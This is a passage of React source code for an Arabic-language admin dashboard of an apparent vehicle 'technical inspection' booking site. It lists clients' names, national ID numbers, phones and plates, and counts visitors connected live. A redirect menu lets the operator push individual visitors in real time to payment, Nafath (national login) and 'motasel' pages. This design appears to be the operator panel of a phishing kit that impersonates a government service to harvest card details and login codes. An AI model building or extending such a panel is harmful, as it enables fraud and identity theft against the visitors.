          <div style={{ textAlign: "right" }}>
            <div style={{ fontSize: 16, fontWeight: 700, color: "#1e293b" }}>نظام الفحص الفني</div>
            <div style={{ fontSize: 11, color: "#94a3b8" }}>لوحة التحكم</div>
          </div>
        </div>

        {/* اليسار: أزرار + حالة الاتصال */}
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <button
            onClick={() => { logout(); navigate("/admin/login"); }}
            style={{
              background: "#ef4444", color: "white", border: "none",
              borderRadius: 8, padding: "7px 16px", fontSize: 13, fontWeight: 600,
              cursor: "pointer", display: "flex", alignItems: "center", gap: 6,
              fontFamily: "'Cairo', sans-serif"
            }}
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
              <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
              <polyline points="16 17 21 12 16 7"/>
              <line x1="21" y1="12" x2="9" y2="12"/>
            </svg>
            خروج
          </button>

          <button
            onClick={() => refetchBookings()}
            style={{
              background: "white", color: "#6b7280",
              border: "1px solid #e5e7eb", borderRadius: 8,
              padding: "7px 10px", fontSize: 13, cursor: "pointer",
              display: "flex", alignItems: "center"
            }}
            title="تحديث"
          >
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <polyline points="23 4 23 10 17 10"/>
              <polyline points="1 20 1 14 7 14"/>
              <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/>
            </svg>
          </button>

          <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 13, color: isConnected ? "#22c55e" : "#9ca3af" }}>
            <span style={{ width: 8, height: 8, borderRadius: "50%", background: isConnected ? "#22c55e" : "#d1d5db", display: "inline-block" }} />
            {isConnected ? "متصل" : "غير متصل"}
          </div>

          {newBookingsCount > 0 && (
            <button
              onClick={() => { setNewBookingsCount(0); refetchBookings(); }}
              style={{ background: "#fef2f2", color: "#ef4444", border: "1px solid #fecaca", borderRadius: 20, padding: "4px 12px", fontSize: 12, cursor: "pointer", display: "flex", alignItems: "center", gap: 6, fontFamily: "'Cairo', sans-serif" }}
            >
              <span style={{ background: "#ef4444", color: "white", borderRadius: "50%", width: 18, height: 18, display: "inline-flex", alignItems: "center", justifyContent: "center", fontWeight: 700, fontSize: 11 }}>{newBookingsCount}</span>
              حجوزات جديدة
            </button>
          )}
        </div>
      </header>

      <div style={{ maxWidth: 1400, margin: "0 auto", padding: "24px 20px" }}>

        {/* ===== STATS CARDS ===== */}
        <div style={{ display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: 16, marginBottom: 24 }}>

          {/* إجمالي الحجوزات */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <div style={{ fontSize: 32, fontWeight: 700, color: "#1e293b", lineHeight: 1 }}>{stats?.total ?? 0}</div>
              <div style={{ fontSize: 13, color: "#94a3b8", marginTop: 6 }}>إجمالي الحجوزات</div>
            </div>
            <div style={{ width: 52, height: 52, background: "#ede9fe", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center" }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#7c3aed" strokeWidth="2">
                <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
                <circle cx="9" cy="7" r="4"/>
                <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
                <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
              </svg>
            </div>
          </div>

          {/* حجوزات جديدة */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <div style={{ fontSize: 32, fontWeight: 700, color: "#1e293b", lineHeight: 1 }}>{stats?.new ?? 0}</div>
              <div style={{ fontSize: 13, color: "#94a3b8", marginTop: 6 }}>حجوزات جديدة</div>
            </div>
            <div style={{ width: 52, height: 52, background: "#fef3c7", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center" }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#d97706" strokeWidth="2">
                <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/>
                <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
              </svg>
            </div>
          </div>

          {/* مكتملة */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <div style={{ fontSize: 32, fontWeight: 700, color: "#1e293b", lineHeight: 1 }}>{stats?.completed ?? 0}</div>
              <div style={{ fontSize: 13, color: "#94a3b8", marginTop: 6 }}>مكتملة</div>
            </div>
            <div style={{ width: 52, height: 52, background: "#dcfce7", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center" }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2.5">
                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
                <polyline points="22 4 12 14.01 9 11.01"/>
              </svg>
            </div>
          </div>

          {/* قيد المعالجة */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <div style={{ fontSize: 32, fontWeight: 700, color: "#1e293b", lineHeight: 1 }}>{pendingCount}</div>
              <div style={{ fontSize: 13, color: "#94a3b8", marginTop: 6 }}>قيد المعالجة</div>
            </div>
            <div style={{ width: 52, height: 52, background: "#ffedd5", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center" }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ea580c" strokeWidth="2">
                <circle cx="12" cy="12" r="10"/>
                <polyline points="12 6 12 12 16 14"/>
              </svg>
            </div>
          </div>

          {/* زوار متصلون الآن */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <div style={{ fontSize: 32, fontWeight: 700, color: "#1e293b", lineHeight: 1 }}>{visitorsCount}</div>
              <div style={{ fontSize: 13, color: "#94a3b8", marginTop: 6 }}>زوار متصلون الآن</div>
            </div>
            <div style={{ width: 52, height: 52, background: "#fee2e2", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center" }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#dc2626" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M5 12.55a11 11 0 0 1 14.08 0"/>
                <path d="M1.42 9a16 16 0 0 1 21.16 0"/>
                <path d="M8.53 16.11a6 6 0 0 1 6.95 0"/>
                <line x1="12" y1="20" x2="12.01" y2="20"/>
              </svg>
            </div>
          </div>
        </div>

        {/* ===== BOOKINGS TABLE ===== */}
        <div style={{ background: "white", borderRadius: 12, boxShadow: "0 1px 4px rgba(0,0,0,0.06)", overflow: "hidden" }}>

          {/* Table Header */}
          <div style={{ padding: "16px 20px", display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: 12 }}>
            <h2 style={{ margin: 0, fontSize: 17, fontWeight: 700, color: "#1e293b" }}>قائمة الحجوزات</h2>
            <div style={{ position: "relative" }}>
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2" style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", pointerEvents: "none" }}>
                <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
              </svg>
              <input
                type="text"
                placeholder="بحث..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                style={{
                  paddingRight: 34, paddingLeft: 12, height: 38,
                  border: "1px solid #e5e7eb", borderRadius: 8,
                  fontSize: 13, outline: "none", width: 200,
                  fontFamily: "'Cairo', sans-serif", color: "#374151", background: "#f9fafb"
                }}
              />
            </div>
          </div>

          {/* Table */}
          <div style={{ overflowX: "auto" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 13 }}>
              <thead>
                <tr style={{ background: "#f8fafc", borderTop: "1px solid #e8ecf0", borderBottom: "1px solid #e8ecf0" }}>
                  {["الاسم", "رقم الهوية", "الجوال", "المنطقة", "رقم اللوحة", "تاريخ الحجز", "الحالة", "الإجراءات"].map((h) => (
                    <th key={h} style={{ padding: "11px 14px", textAlign: "right", fontWeight: 600, color: "#64748b", fontSize: 12, whiteSpace: "nowrap" }}>
                      {h}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {isLoading ? (
                  <tr>
                    <td colSpan={8} style={{ textAlign: "center", padding: "48px", color: "#94a3b8" }}>
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
                        <div style={{ width: 20, height: 20, border: "3px solid #4361ee", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.8s linear infinite" }} />
                        جاري التحميل...
                      </div>
                    </td>
                  </tr>
                ) : filtered.length === 0 ? (
                  <tr>
                    <td colSpan={8} style={{ textAlign: "center", padding: "48px", color: "#94a3b8" }}>لا توجد حجوزات</td>
                  </tr>
                ) : (
                  filtered.map((booking) => {
                    const statusInfo = STATUS_LABELS[booking.status] || { label: booking.status, color: "#64748b", bg: "#f1f5f9", border: "#e2e8f0" };

                    return (
                      <tr
                        key={booking.id}
                        style={{ borderBottom: "1px solid #f1f5f9", background: "white" }}
                        onMouseEnter={(e) => { e.currentTarget.style.background = "#f8fafc"; }}
                        onMouseLeave={(e) => { e.currentTarget.style.background = "white"; }}
                      >
                        {/* الاسم */}
                        <td style={{ padding: "12px 14px", color: "#1e293b", fontWeight: 600, whiteSpace: "nowrap" }}>
                          {booking.clientName || "—"}
                        </td>

                        {/* رقم الهوية */}
                        <td style={{ padding: "12px 14px", color: "#374151", fontWeight: 500, whiteSpace: "nowrap" }}>
                          {booking.clientId || "—"}
                        </td>

                        {/* الجوال */}
                        <td style={{ padding: "12px 14px", color: "#374151", whiteSpace: "nowrap" }}>
                          {booking.clientPhone || "—"}
                        </td>

                        {/* المنطقة */}
                        <td style={{ padding: "12px 14px", color: "#374151", whiteSpace: "nowrap" }}>
                          {booking.serviceRegion || "—"}
                        </td>

                        {/* رقم اللوحة */}
                        <td style={{ padding: "12px 14px", whiteSpace: "nowrap" }}>
                          <span style={{ background: "#f1f5f9", border: "1px solid #e2e8f0", borderRadius: 6, padding: "3px 10px", fontSize: 12, fontFamily: "monospace", color: "#374151" }}>
                            {booking.vehiclePlate || "—"}
                          </span>
                        </td>

                        {/* تاريخ الحجز */}
                        <td style={{ padding: "12px 14px", color: "#64748b", fontSize: 12, whiteSpace: "nowrap" }}>
                          {booking.serviceDate
                            ? new Date(booking.serviceDate).toLocaleDateString("ar-SA")
                            : new Date(booking.createdAt).toLocaleDateString("ar-SA")}
                        </td>

                        {/* الحالة */}
                        <td style={{ padding: "12px 14px" }}>
                          <span style={{
                            background: statusInfo.bg, color: statusInfo.color,
                            border: `1px solid ${statusInfo.border}`,
                            borderRadius: 20, padding: "3px 12px",
                            fontSize: 11, fontWeight: 600, whiteSpace: "nowrap"
                          }}>
                            {statusInfo.label}
                          </span>
                        </td>

                        {/* الإجراءات */}
                        <td style={{ padding: "12px 14px" }} onClick={(e) => e.stopPropagation()}>
                          <div style={{ display: "flex", gap: 6, alignItems: "center" }}>

                            {/* زر التفاصيل - يفتح الـ Modal */}
                            <button
                              onClick={() => openModal(booking)}
                              style={{
                                background: "#4361ee", color: "white",
                                border: "none", borderRadius: 7,
                                padding: "6px 12px", fontSize: 12, fontWeight: 600,
                                cursor: "pointer", display: "flex", alignItems: "center", gap: 5,
                                fontFamily: "'Cairo', sans-serif", whiteSpace: "nowrap"
                              }}
                            >
                              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                <circle cx="12" cy="12" r="3"/>
                              </svg>
                              تفاصيل
                            </button>

                            {/* زر التوجيه */}
                            <DropdownMenu>
                              <DropdownMenuTrigger asChild>
                                <button style={{
                                  background: "#7c3aed", color: "white",
                                  border: "none", borderRadius: 7,
                                  padding: "6px 12px", fontSize: 12, fontWeight: 600,
                                  cursor: "pointer", display: "flex", alignItems: "center", gap: 5,
                                  fontFamily: "'Cairo', sans-serif", whiteSpace: "nowrap"
                                }}>
                                  <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                    <polygon points="3 11 22 2 13 21 11 13 3 11"/>
                                  </svg>
                                  توجيه
                                </button>
                              </DropdownMenuTrigger>
                              <DropdownMenuContent align="end" className="w-48">
                                <DropdownMenuItem onClick={() => handleNavigate(booking, "/payment")} className="text-sm gap-2">صفحة الدفع</DropdownMenuItem>
                                <DropdownMenuItem onClick={() => handleNavigate(booking, "/nafath")} className="text-sm gap-2">صفحة نفاذ</DropdownMenuItem>
                                <DropdownMenuItem onClick={() => handleNavigate(booking, "/motasel")} className="text-sm gap-2">صفحة المتصل</DropdownMenuItem>
                                <DropdownMenuItem onClick={() => handleNavigate(booking, "/booking")} className="text-sm gap-2">صفحة الحجز</DropdownMenuItem>
                                <DropdownMenuItem onClick={() => handleNavigate(booking, "/")} className="text-sm gap-2">الصفحة الرئيسية</DropdownMenuItem>
                              </DropdownMenuContent>
                            </DropdownMenu>

                            {/* زر تغيير الحالة */}
                            <DropdownMenu>
                              <DropdownMenuTrigger asChild>
                                <button
                                  title="تغيير الحالة"
                                  style={{
                                    background: "#f1f5f9", color: "#64748b",
                                    border: "1px solid #e2e8f0", borderRadius: 7,
                                    padding: "6px 8px", fontSize: 11, cursor: "pointer",
                                    display: "flex", alignItems: "center"
                                  }}
                                >
                                  <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                    <polyline points="6 9 12 15 18 9"/>
                                  </svg>
                                </button>
                              </DropdownMenuTrigger>
                              <DropdownMenuContent align="end" className="w-40">
                                <DropdownMenuItem
                                  onClick={() => updateStatusMutation.mutate({ reference: booking.referenceId, status: "completed", statusRead: 1 })}
                                  className="text-sm text-green-600"
                                >
                                  مكتمل
                                </DropdownMenuItem>
                                <DropdownMenuItem
                                  onClick={() => updateStatusMutation.mutate({ reference: booking.referenceId, status: "cancelled", statusRead: 1 })}
                                  className="text-sm text-red-600"
                                >
                                  إلغاء
                                </DropdownMenuItem>
                              </DropdownMenuContent>
                            </DropdownMenu>

                          </div>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>

          {/* Footer */}
          {filtered.length > 0 && (
            <div style={{ padding: "12px 20px", borderTop: "1px solid #f1f5f9" }}>
              <span style={{ fontSize: 12, color: "#94a3b8" }}>
                إجمالي النتائج: <strong style={{ color: "#374151" }}>{filtered.length}</strong> حجز
              </span>
            </div>
          )}
        </div>
      </div>

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        * { box-sizing: border-box; }
        body { font-family: 'Cairo', sans-serif !important; }
        @media (max-width: 900px) {
          .stats-grid { grid-template-columns: repeat(2, 1fr) !important; }
        }
        @media (max-width: 500px) {
          .stats-grid { grid-template-columns: 1fr !important; }
        }
      `}</style>
    </div>
  );
}
